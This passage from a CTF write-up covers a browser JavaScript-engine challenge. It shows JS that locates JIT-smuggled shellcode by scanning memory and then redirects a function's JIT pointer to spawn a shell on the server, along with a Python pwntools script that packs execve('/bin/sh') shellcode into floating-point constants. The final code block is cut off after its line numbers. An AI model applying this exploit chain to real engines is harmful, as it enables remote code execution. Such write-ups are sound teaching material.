</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#09f;font-style:italic">// Brute force per byte until we found our magic string (0x41414141)
</span></span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">for</span> (<span style="color:#069;font-weight:bold">var</span> i <span style="color:#555">=</span> <span style="color:#f60">200</span>n; i <span style="color:#555">&lt;=</span> <span style="color:#f60">132777</span>n; i<span style="color:#555">++</span>) {
</span></span><span style="display:flex;"><span>    print(i)
</span></span><span style="display:flex;"><span>    sc_start <span style="color:#555">=</span> doubleAddBigInt(code_addr, i)
</span></span><span style="display:flex;"><span>    check <span style="color:#555">=</span> read(sc_start)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> (check <span style="color:#555">==</span> <span style="color:#f60">5.40900888</span>e<span style="color:#555">-</span><span style="color:#f60">315</span>) {
</span></span><span style="display:flex;"><span>        print(sc_start)
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">break</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we found it, somehow the JIT-ed result of the function in my local and in the server is pretty different. In my local, the const is separated by some offset, which mean we need to modify our shellcode to be able to jump to the next const, so that our payload is limited 6-bytes per line, because the last 2 bytes will be used to jump to the next const offset.</p>
<p>But in the server, all the const are adjacent to each other, so we don&rsquo;t need to do jump at all. So, for the remote payload, the smuggled shellcode is started from <code>sc_start+8</code>. Below is the proof</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>js&gt; read(sc_start)
</span></span><span style="display:flex;"><span>read(sc_start)
</span></span><span style="display:flex;"><span>5.40900888e-315
</span></span><span style="display:flex;"><span>js&gt; read(doubleAddBigInt(sc_start, 0x8n))
</span></span><span style="display:flex;"><span>read(doubleAddBigInt(sc_start, 0x8n))
</span></span><span style="display:flex;"><span>-6.827620262216015e-229
</span></span><span style="display:flex;"><span>js&gt; read(doubleAddBigInt(sc_start, 0x10n))
</span></span><span style="display:flex;"><span>read(doubleAddBigInt(sc_start, 0x10n))
</span></span><span style="display:flex;"><span>-6.82852429045179e-229
</span></span><span style="display:flex;"><span>js&gt; read(doubleAddBigInt(sc_start, 0x18n))
</span></span><span style="display:flex;"><span>read(doubleAddBigInt(sc_start, 0x18n))
</span></span><span style="display:flex;"><span>-6.82831220543336e-229
</span></span></code></pre></td></tr></table>
</div>
</div><p>Notice that all the const that we previously defined are adjacent to each other in the server.</p>
<p>Now we already know the position of our smuggled shellcode, the last step is we need to jump to it. How to do this? Simple. Remember the <code>sc</code> function metadata, in the <code>0x28</code> offset, there is a pointer to the JIT-ed area right? We just need to replace that with the address of our shellcode. And when we call <code>sc()</code>, it will jump to our shellcode. Below is the final blow for this chall</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>// Our real payload start 8 bytes after it
</span></span><span style="display:flex;"><span>sc_start = doubleAddBigInt(sc_start, 0x8n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// Overwrite the jit address pointer of our sc func to point to our hidden shellcode
</span></span><span style="display:flex;"><span>write(jit_addr, sc_start)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// Call our shell
</span></span><span style="display:flex;"><span>sc()
</span></span></code></pre></td></tr></table>
</div>
</div><p>And below is the snapshot of our spawn shell in the server.
<p class="markdown-image">
  <img src="https://i.imgur.com/WlolpXs.png" alt=""  />
</p></p>
<blockquote>
<p>Disclaimer: I don&rsquo;t know what is the chall intended solution, but for me I think it is enough to spawn a shell. Because in the v2 challenge, we don&rsquo;t have enough privilege to read the flag, so we need to maybe do privilege escalation? But based on the usual browser pwn challenge, spawn a shell and gain RCE should be enough to get the flag, so I assume this is enough.</p>
</blockquote>
<blockquote>
<p>Thanks for reading my writeup, and I&rsquo;m sorry if there are any mistakes on my explanation as this is my first time doing this kind of challenge.</p>
</blockquote>
<h4 id="full-script">Full Script <a href="#full-script" class="anchor">#</a></h4>
<p>Below is the full script that I use to generate the smuggled shellcode</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">pwn</span> <span style="color:#069;font-weight:bold">import</span> p64, u64, p32, u32
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">d2h</span>(f):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#366">hex</span>(struct<span style="color:#555">.</span>unpack(<span style="color:#c30">&#39;&lt;Q&#39;</span>, struct<span style="color:#555">.</span>pack(<span style="color:#c30">&#39;&lt;d&#39;</span>, f))[<span style="color:#f60">0</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">h2d</span>(f):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> struct<span style="color:#555">.</span>unpack(<span style="color:#c30">&#39;&gt;d&#39;</span>, long_to_bytes(f)<span style="color:#555">.</span>rjust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#39;</span><span style="color:#c30;font-weight:bold">\x00</span><span style="color:#c30">&#39;</span>))[<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Craft Payload</span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Shellcode taken from https://ctftime.org/writeup/29915</span>
</span></span><span style="display:flex;"><span>instructions <span style="color:#555">=</span> [
</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;mov ebx, 0x0068732f&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;shl rbx, 32&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;mov edx, 0x6e69622f&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;add rbx, rdx&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;push rbx&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;xor eax, eax&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;mov al, 0x3b&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;mov rdi, rsp&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;xor edx, edx&#34;</span>,
</span></span><span style="display:flex;"><span><span style="color:#c30">&#34;syscall&#34;</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">&#39;function sc() {&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;    sc_marker = </span><span style="color:#a00">{</span>h2d(<span style="color:#f60">0x41414141</span>)<span style="color:#a00">}</span><span style="color:#c30">;      // 0x41414141 in memory. Will be used during searching for the address of our const.&#39;</span>)
</span></span><span style="display:flex;"><span>bytecodes <span style="color:#555">=</span> [asm(i) <span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> instructions]
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i, bytecode <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">enumerate</span>(bytecodes):
</span></span><span style="display:flex;"><span>    x <span style="color:#555">=</span> struct<span style="color:#555">.</span>unpack(<span style="color:#c30">&#34;&lt;d&#34;</span>, (bytecode<span style="color:#555">.</span>ljust(<span style="color:#f60">8</span>, <span style="color:#c30">b</span><span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\x90</span><span style="color:#c30">&#34;</span>)))[<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#39;    SC</span><span style="color:#a00">{</span>i<span style="color:#555">+</span><span style="color:#f60">1</span><span style="color:#a00">}</span><span style="color:#c30"> =</span><span style="color:#a00">{</span>x<span style="color:#a00">}</span><span style="color:#c30">&#39;</span>)
</span></span><span style="display:flex;"><span>    i <span style="color:#555">+=</span> <span style="color:#f60">1</span>
</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">&#39;}&#39;</span>)
</span></span><span style="display:flex;"><span>exit()
</span></span></code></pre></td></tr></table>
</div>
</div><p>Below is the full script that I use to spawn the shell</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
